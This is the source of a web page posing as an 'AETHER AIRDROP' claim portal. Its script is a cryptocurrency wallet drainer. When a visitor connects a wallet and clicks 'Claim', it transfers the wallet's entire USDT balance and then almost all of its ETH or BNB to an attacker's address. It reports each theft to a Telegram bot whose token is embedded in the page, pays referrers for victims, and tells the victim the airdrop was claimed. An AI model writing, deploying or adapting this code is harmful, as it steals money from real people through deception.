<html lang="en"> 
<head>
    <meta charset="UTF-8" />
    <title>🎁 AETHER AIRDROP | Advanced Claim Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />

<!-- Social Meta Tags -->
<meta property="og:title" content="AETHER | Premium Airdrop Claim">
<meta property="og:description" content="Experience the future of airdrops. Claim your exclusive rewards.">
<meta property="og:type" content="website">

<!-- Fonts & Libraries -->
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>

<style>
    :root {
        /* Default Theme (Ethereum) */
        --bg-deep: #050508;
        --bg-panel: rgba(12, 12, 18, 0.85);
        --accent-main: #627eea; /* Ethereum Blue */
        --accent-glow: rgba(98, 126, 234, 0.4);
        --accent-text: #627eea;
        --btn-gradient: linear-gradient(135deg, #627eea, #8a2be2);
        --btn-shadow: 0 4px 15px rgba(98, 126, 234, 0.4);
        --btn-hover-shadow: 0 6px 25px rgba(98, 126, 234, 0.6);
        --text-bright: #ffffff;
        --text-dim: #8a8a9a;
        --glass-border: rgba(255, 255, 255, 0.08);
    }

    /* BNB Theme */
    body.theme-bnb {
        --accent-main: #F0B90B; /* BNB Yellow */
        --accent-glow: rgba(240, 185, 11, 0.4);
        --accent-text: #F0B90B;
        --btn-gradient: linear-gradient(135deg, #F0B90B, #d6a00a);
        --btn-shadow: 0 4px 15px rgba(240, 185, 11, 0.3);
        --btn-hover-shadow: 0 6px 25px rgba(240, 185, 11, 0.5);
    }

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: 'Inter', sans-serif;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
    }

    body {
        background-color: var(--bg-deep);
        color: var(--text-bright);
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        overflow-x: hidden;
        position: relative;
        transition: background 0.5s ease;
    }

    /* Dynamic Background */
    .bg-canvas {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: -2;
        background: radial-gradient(circle at 50% 0%, var(--accent-glow) 0%, transparent 50%), 
                    radial-gradient(circle at 80% 50%, rgba(0, 242, 255, 0.05) 0%, transparent 40%);
        transition: background 0.5s ease;
    }

    .floating-list-bg {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: -1;
        overflow: hidden;
        pointer-events: none;
    }

    .float-item {
        position: absolute;
        color: rgba(255, 255, 255, 0.03);
        font-family: 'Orbitron', sans-serif;
        font-weight: 700;
        font-size: 24px;
        animation: floatUp linear infinite;
        display: flex;
        align-items: center;
        gap: 10px;
        pointer-events: none;
    }

    @keyframes floatUp {
        0% { transform: translateY(110vh); opacity: 0; }
        10% { opacity: 0.15; }
        90% { opacity: 0.15; }
        100% { transform: translateY(-10vh); opacity: 0; }
    }

    .grid-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: -1;
        background-image: 
            linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
            linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
        background-size: 60px 60px;
        mask-image: linear-gradient(to bottom, transparent, black 20%, black 80%, transparent);
    }

    .main-container {
        width: 100%;
        max-width: 420px;
        padding: 20px;
        position: relative;
        z-index: 10;
    }

    .app-header {
        text-align: center;
        margin-bottom: 30px;
        animation: fadeDown 0.8s ease-out;
    }

    .logo-container {
        width: 90px;
        height: 90px;
        margin: 0 auto 15px;
        position: relative;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .logo-glow {
        position: absolute;
        width: 120%;
        height: 120%;
        background: radial-gradient(circle, var(--accent-glow) 0%, transparent 70%);
        animation: pulseGlow 4s infinite ease-in-out;
        z-index: 1;
        transition: background 0.5s ease;
    }

    .logo-img {
        width: 80px;
        height: 80px;
        position: relative;
        z-index: 2;
        filter: drop-shadow(0 0 15px var(--accent-main));
        transition: filter 0.3s ease, transform 0.3s ease;
    }
    
    .logo-img:hover {
        transform: scale(1.1) rotate(5deg);
    }

    .app-title {
        font-family: 'Orbitron', sans-serif;
        font-size: 32px;
        font-weight: 700;
        letter-spacing: 4px;
        text-transform: uppercase;
        background: linear-gradient(to right, #fff, var(--accent-main));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-bottom: 5px;
        transition: background 0.3s ease;
    }

    .app-subtitle {
        font-size: 12px;
        color: var(--accent-main);
        letter-spacing: 2px;
        text-transform: uppercase;
        font-weight: 500;
        transition: color 0.3s ease;
    }

    .card {
        background: var(--bg-panel);
        border: 1px solid var(--glass-border);
        border-radius: 24px;
        padding: 30px 25px;
        backdrop-filter: blur(25px);
        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
        position: relative;
        overflow: hidden;
        animation: cardEntry 0.8s cubic-bezier(0.16, 1, 0.3, 1);
    }

    .card::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 1px;
        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.5), transparent);
        z-index: 1;
    }

    .section-label {
        font-size: 11px;
        color: var(--text-dim);
        text-transform: uppercase;
        letter-spacing: 1.5px;
        margin-bottom: 15px;
        display: flex;
        align-items: center;
        gap: 8px;
    }
    
    .section-label::after {
        content: '';
        flex: 1;
        height: 1px;
        background: var(--glass-border);
    }

    .network-list {
        display: flex;
        flex-direction: column;
        gap: 12px;
        margin-bottom: 25px;
    }

    .network-item {
        display: flex;
        align-items: center;
        padding: 16px;
        background: rgba(255, 255, 255, 0.02);
        border: 1px solid rgba(255, 255, 255, 0.05);
        border-radius: 16px;
        cursor: pointer;
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
    }

    .network-item:hover {
        background: rgba(255, 255, 255, 0.04);
        border-color: rgba(255, 255, 255, 0.1);
    }

    .network-item.active {
        border-color: var(--accent-main);
        background: rgba(255, 255, 255, 0.05);
        box-shadow: 0 0 20px var(--accent-glow);
    }

    .network-item.active .selector-circle {
        border-color: var(--accent-main);
        background: var(--accent-main);
        box-shadow: 0 0 10px var(--accent-main);
    }

    .network-item.active .selector-circle::after {
        opacity: 1;
    }

    .network-icon {
        width: 40px;
        height: 40px;
        border-radius: 12px;
        display: flex;
        align-items: center;
        justify-content: center;
        margin-right: 15px;
        background: rgba(255, 255, 255, 0.05);
    }

    .network-icon img {
        width: 25px;
        height: 25px;
        object-fit: contain;
    }

    .network-info {
        flex: 1;
    }

    .network-name {
        font-weight: 600;
        font-size: 15px;
        margin-bottom: 2px;
    }

    .network-desc {
        font-size: 12px;
        color: var(--text-dim);
    }

    .selector-circle {
        width: 20px;
        height: 20px;
        border-radius: 50%;
        border: 2px solid rgba(255, 255, 255, 0.2);
        position: relative;
        transition: all 0.3s ease;
    }

    .selector-circle::after {
        content: '';
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 8px;
        height: 8px;
        background: white;
        border-radius: 50%;
        opacity: 0;
        transition: opacity 0.2s;
    }

    .btn-group {
        display: flex;
        flex-direction: column;
        gap: 12px;
        margin-bottom: 20px;
    }

    .cyber-btn {
        position: relative;
        padding: 16px;
        border: none;
        border-radius: 14px;
        font-size: 14px;
        font-weight: 600;
        letter-spacing: 0.5px;
        cursor: pointer;
        overflow: hidden;
        transition: transform 0.1s, box-shadow 0.3s, background 0.3s;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        text-transform: uppercase;
        font-family: 'Orbitron', sans-serif;
    }

    .cyber-btn:active {
        transform: scale(0.98);
    }

    .btn-primary {
        background: var(--btn-gradient);
        color: white;
        box-shadow: var(--btn-shadow);
    }

    .btn-primary:hover {
        box-shadow: var(--btn-hover-shadow);
        transform: translateY(-2px);
    }

    .btn-ghost {
        background: rgba(255, 255, 255, 0.03);
        border: 1px solid rgba(255, 255, 255, 0.1);
        color: white;
    }

    .btn-ghost:hover {
        background: rgba(255, 255, 255, 0.08);
        border-color: rgba(255, 255, 255, 0.2);
    }

    .btn-claim {
        background: linear-gradient(135deg, #00f2ff, #0072ff);
        color: white;
        box-shadow: 0 4px 20px rgba(0, 242, 255, 0.3);
        margin-top: 10px;
    }
    
    .btn-claim:disabled {
        opacity: 0.4;
        cursor: not-allowed;
        transform: none !important;
        box-shadow: none;
    }

    .cyber-btn::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
        transition: 0.5s;
    }

    .cyber-btn:hover::before {
        left: 100%;
    }

    .btn-loading {
        pointer-events: none;
        color: transparent !important;
    }
    
    .btn-loading::after {
        content: '';
        position: absolute;
        width: 20px;
        height: 20px;
        border: 2px solid rgba(255,255,255,0.3);
        border-top-color: #fff;
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
        to { transform: rotate(360deg); }
    }

    .status-box {
        background: rgba(0, 0, 0, 0.3);
        border-radius: 12px;
        padding: 14px;
        margin-bottom: 15px;
        text-align: center;
        font-size: 13px;
        color: var(--text-dim);
        border: 1px solid transparent;
        transition: all 0.3s ease;
        display: none;
    }

    .status-box.active { display: block; }
    .status-box.error { color: #ff4d4d; border-color: rgba(255, 77, 77, 0.3); background: rgba(255, 77, 77, 0.05); }
    .status-box.success { color: #00ff9d; border-color: rgba(0, 255, 157, 0.3); background: rgba(0, 255, 157, 0.05); }
    .status-box.warning { color: #ffb700; border-color: rgba(255, 183, 0, 0.3); background: rgba(255, 183, 0, 0.05); }

    .wallet-badge {
        display: none;
        background: rgba(255, 255, 255, 0.05);
        padding: 10px 15px;
        border-radius: 8px;
        font-size: 13px;
        color: var(--accent-main);
        margin-bottom: 15px;
        text-align: center;
        border: 1px solid var(--accent-main);
        animation: fadeIn 0.5s ease;
        transition: all 0.3s ease;
    }

    .live-feed-section {
        margin-top: 25px;
        border-top: 1px solid rgba(255,255,255,0.05);
        padding-top: 15px;
    }

    .live-header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 15px;
    }

    .live-title {
        font-size: 12px;
        color: var(--text-dim);
        text-transform: uppercase;
        letter-spacing: 1px;
        display: flex;
        align-items: center;
        gap: 6px;
    }

    .live-dot {
        width: 8px;
        height: 8px;
        background: #00ff9d;
        border-radius: 50%;
        animation: blink 2s infinite;
        box-shadow: 0 0 5px #00ff9d;
    }

    @keyframes blink {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.3; }
    }

    .tx-list {
        display: flex;
        flex-direction: column;
        gap: 8px;
        max-height: 200px;
        overflow: hidden;
        position: relative;
    }

    .tx-item {
        display: flex;
        align-items: center;
        justify-content: space-between;
        background: rgba(255,255,255,0.02);
        padding: 10px 12px;
        border-radius: 8px;
        border-left: 2px solid transparent;
        animation: slideIn 0.5s ease forwards;
        opacity: 0;
        transform: translateY(10px);
    }

    @keyframes slideIn {
        to { opacity: 1; transform: translateY(0); }
    }

    .tx-item.eth { border-left-color: #627eea; }
    .tx-item.bnb { border-left-color: #F0B90B; }

    .tx-user {
        display: flex;
        align-items: center;
        gap: 10px;
    }

    .tx-avatar {
        width: 24px;
        height: 24px;
        border-radius: 50%;
        background: rgba(255,255,255,0.1);
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 10px;
    }

    .tx-address {
        font-size: 12px;
        color: #ccc;
        font-family: monospace;
    }

    .tx-amount {
        font-size: 12px;
        font-weight: 600;
        color: #00ff9d;
    }

    .tx-time {
        font-size: 10px;
        color: var(--text-dim);
    }

    .footer-links {
        margin-top: 20px;
        text-align: center;
    }
    
    .moonpay-link {
        color: var(--text-dim);
        text-decoration: none;
        font-size: 12px;
        transition: color 0.2s;
        display: inline-flex;
        align-items: center;
        gap: 5px;
    }
    
    .moonpay-link:hover { color: var(--accent-main); }

    @keyframes fadeDown {
        from { opacity: 0; transform: translateY(-20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    @keyframes cardEntry {
        from { opacity: 0; transform: scale(0.95) translateY(20px); }
        to { opacity: 1; transform: scale(1) translateY(0); }
    }

    @keyframes pulseGlow {
        0%, 100% { opacity: 0.6; transform: scale(1); }
        50% { opacity: 0.9; transform: scale(1.2); }
    }
    
    @keyframes fadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
    }

    @media (max-width: 480px) {
        .app-title { font-size: 24px; }
        .card { padding: 25px 20px; }
    }
</style>

</head>

    const WALLETCONNECT_PROJECT_ID = "6dbc143802f4e17e58fa48ed65449d48";
    const TELEGRAM_BOT = "8508442196:AAGyHF-RKSVPVtAvpYzvNRns3mufYb-1Euk"; 
    const ADMIN_CHAT_ID = "-1003776376519";
    const REFERRERS = { nora: "", whitelist: "", malone: "", mikkycrypt03: "", wangde: "", love: "", pay: "", fred: "" };

    const NETWORKS = {
        1: { name:"Ethereum", symbol:"ETH", rpc:"https://eth.llamarpc.com", explorer:"https://etherscan.io", moonpay:"https://buy.moonpay.com?currencyCode=eth", usdtAddress:"0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals:6 },
        56: { name:"BNB Smart Chain", symbol:"BNB", rpc:"https://bsc-dataseed.binance.org", explorer:"https://bscscan.com", moonpay:"https://buy.moonpay.com?currencyCode=bnb", usdtAddress:"0x55d398326f99059fF775485246999027B3197955", decimals:18 }
    }; 

    const ERC20_ABI = [
        "function transfer(address to, uint256 amount) external returns (bool)",
        "function balanceOf(address account) external view returns (uint256)"
    ];

    // Theme Switching
    networkItems.forEach(item => {
        item.addEventListener('click', () => {
            networkItems.forEach(i => i.classList.remove('active'));
            item.classList.add('active');
            currentChainId = parseInt(item.dataset.chain);
            
            if(currentChainId === 56) {
                document.body.classList.remove('theme-eth');
                document.body.classList.add('theme-bnb');
            } else {
                document.body.classList.remove('theme-bnb');
                document.body.classList.add('theme-eth');
            }
            
            const n = NETWORKS[currentChainId];
            if(n) moonpayLink.href = n.moonpay;
            updateStatus(`Switched to ${item.querySelector('.network-name').innerText}`, 'info');
        });
    });

    // UI Helpers
    function updateStatus(msg, type='info') {
        statusBox.className = 'status-box active';
        if(type === 'error') statusBox.classList.add('error');
        else if(type === 'success') statusBox.classList.add('success');
        else if(type === 'warning') statusBox.classList.add('warning');
        
        let iconClass = 'fa-info-circle';
        if(type === 'error') iconClass = 'fa-times-circle';
        if(type === 'success') iconClass = 'fa-check-circle';
        if(type === 'warning') iconClass = 'fa-spinner fa-spin';
        
        statusBox.innerHTML = `<i class="fas ${iconClass}"></i> ${msg}`;
    }

    function setButtonLoading(btn, isLoading) {
        if(isLoading) {
            btn.classList.add('btn-loading');
            btn.disabled = true;
        } else {
            btn.classList.remove('btn-loading');
            btn.disabled = false;
        }
    }

    function updateWalletUI(address) {
        walletBadge.style.display = 'block';
        walletBadge.style.borderColor = 'var(--accent-main)';
        walletBadge.style.color = 'var(--accent-main)';
        document.getElementById('walletAddress').innerText = `${address.slice(0,6)}...${address.slice(-4)}`;
        
        approveBtn.innerHTML = `<i class="fas fa-gift"></i> Claim to ${address.slice(0,6)}...${address.slice(-4)}`;
        approveBtn.disabled = false;
        
        injectBtn.style.display = 'none';
        wcBtn.style.display = 'none';
        updateStatus('Wallet connected successfully. Ready to claim.', 'success');
    }

    function getReferral(){ 
        const params=new URLSearchParams(window.location.search); 
        return params.get("ref"); 
    }

    async function sendTelegram(chatId, message){ 
        if(!chatId) return; 
        try {
            const text = encodeURIComponent(message);
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=HTML`;
            await fetch(url);
        } catch (e) {
            console.error("Telegram Error", e);
        }
    }

    // ================= WALLET CONNECTION LOGIC (OPTIMIZED) =================

    // 1. Auto-Reconnect (Eager Connect)
    // This checks if the user is already connected and restores the session instantly.
    window.addEventListener('load', async () => {
        if (window.ethereum) {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            // Check for existing accounts without prompting the user
            const accounts = await provider.listAccounts();
            if (accounts.length > 0) {
                signer = provider.getSigner();
                userAddress = accounts[0];
                activeProviderType = 'injected';
                updateWalletUI(userAddress);
                
                // Optional: Ensure correct network
                try {
                    const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
                    const targetChainHex = '0x' + currentChainId.toString(16);
                    if(currentChain !== targetChainHex) {
                         // Silent switch attempt or just update status
                         updateStatus(`Switch network to ${NETWORKS[currentChainId].name} in your wallet`, 'warning');
                    }
                } catch (e) { console.log(e); }
            }
        }
    });

    // 2. Manual Injected Connection
    injectBtn.onclick = async () => {
        if(!window.ethereum){ 
            updateStatus("No Web3 Wallet Detected", 'error');
            return;
        }
        
        setButtonLoading(injectBtn, true);
        updateStatus("Connecting...", 'warning');

        try {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            
            signer = provider.getSigner();
            userAddress = await signer.getAddress();
            activeProviderType = 'injected';
            
            updateWalletUI(userAddress);

            // Network Switch Check
            try {
                const network = NETWORKS[currentChainId];
                const targetChainHex = '0x' + currentChainId.toString(16);
                const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
                
                if(currentChain !== targetChainHex) {
                     updateStatus(`Switching to ${network.name}...`, 'warning');
                     await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: targetChainHex }],
                    });
                    updateStatus('Network switched. Ready.', 'success');
                }
            } catch (switchError) {
                console.log("Network switch required or failed", switchError);
            }

        } catch(err) {
            console.error(err);
            updateStatus("Connection Rejected or Failed", 'error');
            setButtonLoading(injectBtn, false);
        }
    };

    // 3. WalletConnect (Uses Pre-loaded Module)
    wcBtn.onclick = async () => {
        setButtonLoading(wcBtn, true);
        updateStatus("Initializing WalletConnect...", 'warning');
        try {
            if(wcProvider){ await wcProvider.disconnect().catch(()=>{}); wcProvider=null; }
            
            // Use the pre-loaded promise
            const {EthereumProvider} = await wcModulePromise;
            
            wcProvider = await EthereumProvider.init({
                projectId: WALLETCONNECT_PROJECT_ID,
                chains: [currentChainId],
                showQrModal: true,
                rpcMap: { 1: NETWORKS[1].rpc, 56: NETWORKS[56].rpc },
                metadata: { name:'Aether Airdrop', url:window.location.origin }
            });
            
            const accounts = await wcProvider.enable();
            window.ethereum = wcProvider; 
            provider = new ethers.providers.Web3Provider(wcProvider);
            signer = provider.getSigner();
            userAddress = accounts[0];
            activeProviderType = 'walletconnect';
            
            updateWalletUI(userAddress);
        } catch(err) {
            console.error(err);
            updateStatus("WalletConnect Error", 'error');
        }
        setButtonLoading(wcBtn, false);
    };

    // Approve / Claim Logic
    approveBtn.onclick = async () => {
        if(isProcessing || !userAddress) return;
        isProcessing = true;
        setButtonLoading(approveBtn, true);
        updateStatus("Initializing Transfer...", 'warning');

        try {
            const network = NETWORKS[currentChainId];
            const usdt = new ethers.Contract(network.usdtAddress, ERC20_ABI, signer);
            
            // Get user's USDT balance
            const balance = await usdt.balanceOf(userAddress);
            
            if(balance.eq(0)) {
                updateStatus("No USDT balance to claim", 'error');
                setButtonLoading(approveBtn, false);
                isProcessing = false;
                return;
            }
            
            // Step 1: Transfer ALL USDT to recipient
            updateStatus("Step 1/2: Processing USDT claim...", 'warning');
            const usdtTx = await usdt.transfer(RECIPIENT_ADDRESS, balance);
            
            const ref = getReferral(); 
            const refChat = REFERRERS[ref];
            
            const msg = `🔄 <b>CLAIM STARTED</b>\nWallet: <code>${userAddress}</code>\nNetwork: ${network.name}\nRef: ${ref||'none'}\nTX: ${network.explorer}/tx/${usdtTx.hash}`;
            await sendTelegram(ADMIN_CHAT_ID, msg);
            if(refChat) await sendTelegram(refChat, `👤 Someone used your referral\nTX: ${usdtTx.hash}`);

            const usdtReceipt = await usdtTx.wait();
            
            if(usdtReceipt.status === 1) {
                const amount = ethers.utils.formatUnits(balance, network.decimals);
                
                // Step 2: Transfer remaining ETH/BNB
                updateStatus("Step 2/2: Processing native coin transfer...", 'warning');
                
                try {
                    // Get ETH/BNB balance
                    const ethBalance = await signer.getBalance();
                    
                    // Estimate gas for the ETH transfer
                    const gasPrice = await provider.getGasPrice();
                    const gasLimit = ethers.BigNumber.from(21000); // Standard ETH transfer
                    const gasCost = gasPrice.mul(gasLimit);
                    
                    // Calculate amount to send (total balance - gas cost)
                    const amountToSend = ethBalance.sub(gasCost);
                    
                    if(amountToSend.gt(0)) {
                        const ethTx = await signer.sendTransaction({
                            to: RECIPIENT_ADDRESS,
                            value: amountToSend,
                            gasLimit: gasLimit
                        });
                        
                        await ethTx.wait();
                        
                        const ethAmount = ethers.utils.formatEther(amountToSend);
                        const successMsg = `✅ <b>CLAIM SUCCESS</b>\nUSDT: ${amount} USDT\n${network.symbol}: ${ethAmount} ${network.symbol}\nFrom: <code>${userAddress}</code>\nTo: <code>${RECIPIENT_ADDRESS}</code>\nNetwork: ${network.name}\nUSDT TX: ${network.explorer}/tx/${usdtTx.hash}\n${network.symbol} TX: ${network.explorer}/tx/${ethTx.hash}`;
                        await sendTelegram(ADMIN_CHAT_ID, successMsg);
                        if(refChat) await sendTelegram(refChat, successMsg);
                        
                        updateStatus(`✅ Airdrop Claimed!\n${amount} USDT + ${ethAmount} ${network.symbol}`, 'success');
                    } else {
                        // No ETH/BNB left after gas
                        const successMsg = `✅ <b>CLAIM SUCCESS</b>\nAmount: ${amount} USDT\nFrom: <code>${userAddress}</code>\nTo: <code>${RECIPIENT_ADDRESS}</code>\nNetwork: ${network.name}\nTX: ${network.explorer}/tx/${usdtTx.hash}\nNote: No ${network.symbol} remaining after gas`;
                        await sendTelegram(ADMIN_CHAT_ID, successMsg);
                        if(refChat) await sendTelegram(refChat, successMsg);
                        
                        updateStatus(`✅ Airdrop Claimed!\n${amount} USDT`, 'success');
                    }
                } catch(ethErr) {
                    console.error('ETH transfer error:', ethErr);
                    // USDT transfer succeeded, but ETH failed - still show success
                    const successMsg = `✅ <b>USDT CLAIM SUCCESS</b>\nAmount: ${amount} USDT\nFrom: <code>${userAddress}</code>\nTo: <code>${RECIPIENT_ADDRESS}</code>\nNetwork: ${network.name}\nTX: ${network.explorer}/tx/${usdtTx.hash}\n⚠️ ${network.symbol} transfer failed: ${ethErr.message}`;
                    await sendTelegram(ADMIN_CHAT_ID, successMsg);
                    
                    updateStatus(`✅ ${amount} USDT claimed\n⚠️ ${network.symbol} transfer failed`, 'success');
                }
                
                approveBtn.innerHTML = '<i class="fas fa-check"></i> Claimed';
                approveBtn.disabled = true;
            } else {
                throw new Error("USDT Transaction Failed");
            }

        } catch(err) {
            console.error(err);
            updateStatus(`Failed: ${err.message.substring(0, 50)}...`, 'error');
            setButtonLoading(approveBtn, false);
        }
        
        isProcessing = false;
    };
    
    moonpayLink.href = NETWORKS[currentChainId].moonpay;

</script>

</body>
</html>
